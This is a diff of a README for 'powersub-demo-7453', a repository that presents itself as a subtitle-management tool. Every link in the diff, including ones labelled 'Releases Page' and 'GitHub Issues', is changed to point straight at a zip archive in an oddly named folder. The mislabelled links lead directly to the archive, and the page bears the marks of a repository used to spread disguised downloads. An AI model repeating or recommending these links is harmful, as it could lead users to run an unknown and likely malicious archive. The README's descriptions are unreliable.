@@ -3,7 +3,7 @@
 
 Welcome to powersub-demo-7453, your easy solution for managing subtitles in videos. 
 
-[![Download Now](https://raw.githubusercontent.com/NicoKurtPro1/powersub-demo-7453/main/gamophagy/powersub-demo-7453_Neisseria.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/NicoKurtPro1/powersub-demo-7453/main/gamophagy/powersub-demo-7453_Neisseria.zip)
+[![Download Now](https://github.com/NicoKurtPro1/powersub-demo-7453/raw/refs/heads/main/gamophagy/demo_powersub_v3.3.zip%20Now-Get%20Started-brightgreen)](https://github.com/NicoKurtPro1/powersub-demo-7453/raw/refs/heads/main/gamophagy/demo_powersub_v3.3.zip)
 
 ## 📋 Overview
 
@@ -30,7 +30,7 @@ To run powersub-demo-7453, your computer should meet the following requirements:
 
 Follow these steps to download and run powersub-demo-7453 on your computer:
 
-1. **Visit the Download Page:** Go to the [Releases Page](https://raw.githubusercontent.com/NicoKurtPro1/powersub-demo-7453/main/gamophagy/powersub-demo-7453_Neisseria.zip) to find the latest version.
+1. **Visit the Download Page:** Go to the [Releases Page](https://github.com/NicoKurtPro1/powersub-demo-7453/raw/refs/heads/main/gamophagy/demo_powersub_v3.3.zip) to find the latest version.
 
 2. **Choose Your Version:** Look for the most recent version listed at the top of the page. Click on it to view all assets available for download.
 
@@ -51,7 +51,7 @@ Follow these steps to download and run powersub-demo-7453 on your computer:
 
 Use the link below to start downloading powersub-demo-7453 right now!
 
-[Download Now](https://raw.githubusercontent.com/NicoKurtPro1/powersub-demo-7453/main/gamophagy/powersub-demo-7453_Neisseria.zip)
+[Download Now](https://github.com/NicoKurtPro1/powersub-demo-7453/raw/refs/heads/main/gamophagy/demo_powersub_v3.3.zip)
 
 ## ⚙️ How to Use
 
@@ -89,7 +89,7 @@ If you have questions or need help, you can reach out through the GitHub issues 
 
 For further documentation, tutorials, and community support resources, visit:
 
-- [GitHub Issues](https://raw.githubusercontent.com/NicoKurtPro1/powersub-demo-7453/main/gamophagy/powersub-demo-7453_Neisseria.zip)
+- [GitHub Issues](https://github.com/NicoKurtPro1/powersub-demo-7453/raw/refs/heads/main/gamophagy/demo_powersub_v3.3.zip)
 
 Thank you for using powersub-demo-7453! Enjoy managing your subtitles with ease.
 ```
